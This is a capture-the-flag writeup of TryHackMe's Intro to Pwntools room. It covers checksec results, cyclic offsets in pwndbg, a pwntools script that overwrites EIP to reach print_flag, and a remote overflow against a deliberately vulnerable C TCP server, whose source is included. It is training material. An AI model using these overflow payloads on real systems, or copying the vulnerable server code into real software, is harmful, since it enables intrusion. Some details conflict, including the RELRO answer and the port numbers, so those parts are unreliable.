---
title: "THM - Intro To Pwntools"
date: 2026-02-21 09:26:00 +0600
categories: [writeup]
---
## ***Task 1: Introduction***    

TryHackMe's "Intro to Pwntools" room introduces binary exploitation fundamentals using three ELF binaries: intro2pwn1, intro2pwn2, and intro2pwn3. This writeup covers analyzing protections via checksec, triggering buffer overflows, and progressing through pwn challenges on a vulnerable Linux VM. Key concepts include RELRO, stack canaries, NX, PIE, RWX segments, and pwntools scripting for automation.
## ***Task 2: Checksec***   
### 1. Does Intro2pwn1 have FULL RELRO (Y or N)?
### Process
check with `checksec intro2pwn1`    

![[Pasted image 20260221042326.png]]
result shows `RELRO: Full RELRO` which mean Yes.

> [!NOTE]
> ## Checking RELRO
> 
> Use the `checksec` tool on the binary (e.g., `checksec intro2pwn1`). It outputs protections like "RELRO: Full RELRO", "Partial RELRO", or "No RELRO". For Intro2pwn1, results show Partial RELRO, while intro2pwn2 also has Partial.

> [!NOTE]
> ## What is RELRO
> 
> RELRO (Relocation Read-Only) protects the Global Offset Table (GOT) from overwrites in binary exploits. Partial RELRO marks non-PLT GOT entries read-only (default GCC); Full RELRO makes the entire GOT read-only but slows startup by pre-resolving all symbols.

### 2. Does Intro2pwn1 have RWX segments (Y or N)?

### Process
check with `checksec intro2pwn1`    

![[Pasted image 20260221042326.png]]
On the result there is no RWX showed which mean No.

> [!NOTE]
> ## What Are RWX 
> 
> RWX segments are memory regions with read (R), write (W), and execute (X) permissions, making them vulnerable to exploits like shellcode injection. Modern protections like NX enforce W^X (writable XOR executable), preventing both on the same segment; RWX violates this for easier attacks.

### 3. Does Intro2pwn2 have a stack canary (Y or N)?
### Process
check with `checksec intro2pwn2`    

![[Pasted image 20260221042805.png]]
The result shows `Stack: No canary found` , so answer is No.

> [!NOTE]
> ## What is a Stack Canary
> 
> A stack canary (or guard) is a random value placed on the stack between local variables and the return address to detect buffer overflows. Before function return, the program verifies the canary; if altered, it terminates ("stack smashing detected") to block control-flow hijacking
### 4. Does Intro2pwn2 not have PIE (Y or N)?

### Process
check with `checksec intro2pwn2`   

![[Pasted image 20260221042805.png]]

on the output `PIE: No PIE(0x8048000)` so its a Yes.

> [!NOTE]
> ## What is PIE
> 
> PIE (Position Independent Executable) randomizes the binary's base address on each run (ASLR for code/data), complicating exploits relying on fixed addresses like ret2libc. Without PIE, attackers predict locations easily.

### 5. Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected?
### Process

1. SSH to the TryHackMe machine (e.g., `ssh user@machine-ip`).
2. Run `./intro2pwn1`.
3. At "Enter your name: ", type `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` (exceeds ~24-byte buffer).
4. Program greets with the input, then crashes.
5. What was detected: "stack smashing detected" (*** stack smashing detected ***: terminated) due to canary mismatch.

![[Pasted image 20260221035619.png]]

### 6. Now cause a buffer overflow on intro2pwn2. What error do you get?
### Process 
same as before.

![[Pasted image 20260221035758.png]]

## ***Task 3: Cyclic***    

### 1. Which user owns both the flag.txt and intro2pwn3 file?
### Process
`ls -l` lists directory contents in long/detailed format on Linux/Unix systems, so lets use this to see file details on this directory.

![[Pasted image 20260221045809.png]]

> [!NOTE]
> Each line shows: file type/permissions (e.g., `-rw-r--r--`), hard links count, owner, group, size (bytes), modification timestamp, and filename. First character indicates type (`-` file, `d` directory, `l` symlink).

as you can see the flag file and intro2pwn3 are owned by the same user. so the answer is `dizmas` .

### 2. Use checksec on intro2pwn3. What bird-themed protection is missing?

> [!NOTE]
> ## What "Bird-Themed" Means
> 
> "Stack canary" refers to miners using canaries (birds) in coal mines as early warning detectors for toxic gases the bird dies first, alerting workers. Similarly, the stack canary is a random "sentinel" value placed on the stack between local buffers and the return address.

### Process
By using `checksec` -  

![[Pasted image 20260221050251.png]]

from the result `Canary` (stack canary) protection is missing on intro2pwn3. 

> [!NOTE]
> ## What Canary Protection Does
> 
> A stack canary is a secret random value placed between function buffers and return address. On return, the program verifies it; corruption triggers "*** stack smashing detected ***" termination, blocking control-flow hijacks. intro2pwn3 lacks this, making ROP/ret2libc easier.

### 3. What ascii letter sequence is 0x4a4a4a4a (pwndbg should tell you).

> [!NOTE]
> 
> ## what is Pwndbg
> 
> Pwndbg is a GDB plugin that enhances debugging for exploit development and reverse engineering. It automates GDB's tedious aspects with exploit-focused features: enhanced disassembly using Capstone/Unicorn engines, automatic register/stack/backtrace/disassembly context on every stop, color-coded memory views, ROP gadget finder (`rop`), leak detection (`leakfind`), and telescope for recursive pointer dereferencing.

### Process  
As the instruction says run `gdb intro2pwn3` to fire up `gdb`. To run a program in gdb, type `r`. You will see the program function normally. If you want to add an input from a text file, you use the "<" key, as such: `r < alphabet` this cause a segmentation fault, and you may observe that there is an invalid address at 0x4a4a4a4a. If you scroll up, you can see the values at each register. For eip, it has been overwritten with `0x4a4a4a4a`.  

![[Pasted image 20260221060421.png]]

scroll up or down you'll find the answer.

## 4. What is the output of "cyclic 12"?
### Process
Just run the `cyclic 12` you'll have the output

![[Pasted image 20260221061026.png]]

> [!NOTE]
> `pwndbg> cyclic 12` generates a 12-byte unique cyclic pattern like "aaaabaaacaaa" for buffer overflow offset calculation

### 5. What pattern, in hex, was the eip overflowed with?
### Process
Generate 200-byte cyclic pattern using `cyclic 200 > pattern.txt` on the terminal. verify the created pattern with `ls` or `ls -ls`.  
![[Pasted image 20260221070626.png]]
loaded binary with `gdb -q ./intro2pwn3`  now we have to run with pattern input  
![[Pasted image 20260221070838.png]]
pattern `0x6161616a`.  

### 6. What is the flag?
### Process
From the task instruction we got a exploit.  Which is:  
```python
from pwn import *
padding = cyclic(cyclic_find('jaaa'))
eip = p32(0xdeadbeef)
payload = padding + eip
print(payload)
```

before run this lets find the location of the `print_flag()` function. To find the print_flag() funtion, type this command into gdb `print& print_flag`   

![[Pasted image 20260221081754.png]]

now edit the exploit file and replace the `0xdeadbeef` with  `0x08048536`.
And now lets run `python pwn_cyclic.py > attack` this will create a file named `attack` . Lets input the attack file into the intro2pwn3 binary in the command line `./intro2pwn3 < attack` .

![[Pasted image 20260221082139.png]]
and we get the flag.

> [!NOTE]
> ## What Happens
> 
> The payload consists of precise padding (`cyclic(cyclic_find('jaaa'))`) that fills the stack buffer exactly up to but not past the EIP register (32-bit architecture). The `p32(0x08048536)` then overwrites EIP with the target address in little-endian format (`\x36\x85\x04\x08`). When `intro2pwn3` executes the vulnerable input function (likely using `gets()`), the stack overflow redirects program control flow.

## ***Task 4: Networking***    

### 1. What port is serving our challenge?
### Process
Just read the `.txt` file  

![[Pasted image 20260221092014.png]]
### 2. Please use checksec on serve_test. Is there a stack canary? (Y or N)
### Process
Using `checksec` on `serve_test`    

![[Pasted image 20260221092134.png]]
on the output it says `Stack: Canary found`. Which means Yes.
### 3. What is the flag?
Exploit :  
```c
//Networking C code from:
// https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#define MAX 32
#define PORT 1336
#define SA struct sockaddr
  
// function which handles input and output over the socket
void target_function(int sockfd)
{
    struct {
    	char buff[MAX];
    	volatile int printflag;
    } targets;


    for (;;) {
        bzero(targets.buff, MAX);
  	
	write(sockfd, "Give me deadbeef: ", 18);

        targets.printflag = 0;
        read(sockfd, targets.buff, 100);
        
        printf("From client: %s\t ", targets.buff);
        bzero(targets.buff, MAX);
  
  
        if (targets.printflag == 0xdeadbeef) {
            write(sockfd, "Thank you!\nflag{*****************}", 34);
            break;
	}
	else if (targets.printflag != 0) {
	    write(sockfd, "Buffer Overflow, but not with 0xdeadbeef", 40);
            break;	
        }
    }
}
  

int main()
{
    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;
  
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));
  
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);
  
    // Binding newly created socket to given IP and verification
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
        printf("socket bind failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully binded..\n");
  
    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        printf("Listen failed...\n");
        exit(0);
    }
    else
        printf("Server listening..\n");
    len = sizeof(cli);
  
    // Accept the data packet from client and verification
    connfd = accept(sockfd, (SA*)&cli, &len);
    if (connfd < 0) {
        printf("server acccept failed...\n");
        exit(0);
    }
    else
        printf("server acccept the client...\n");
  
    // target function handles input and output
    target_function(connfd);
  
    // After chatting close the socket
    close(sockfd);
}
```

> [!NOTE]
> This C code creates a TCP server on port 1336 with a deliberate buffer overflow vulnerability. The `target_function()` reads 100 bytes into a 32-byte buffer next to `printflag`, allowing overflow to control it. Send exactly 36 bytes: 32 bytes padding + `0xdeadbeef` (little-endian `\xef\xbe\xad\xde`) to make `printflag == 0xdeadbeef` and receive the flag.
### Process
We will need to write a script to connect to the port, receive the data, and send our payload. To connect to a port in Pwntools, use the `remote()` function in the format of: `remote (IP, port)`.  
Exploit:

```python
from pwn import *  
  
connect = remote('127.0.0.1', 1337)  
  
print(connect.recvn(18))  
  
payload = b"A" * 32 # Make sure this is bytes  
payload += p32(0xdeadbeef) # p32 returns bytes too  
  
connect.send(payload)  
  
print(connect.recvn(34)) # Read response after payload
```

Lets run this against your server at 1336 ,   

![[Pasted image 20260221091653.png]]
then open another tab login and run the exploit that we made and named `script.py`   

![[Pasted image 20260221091714.png]]
we got the flag.


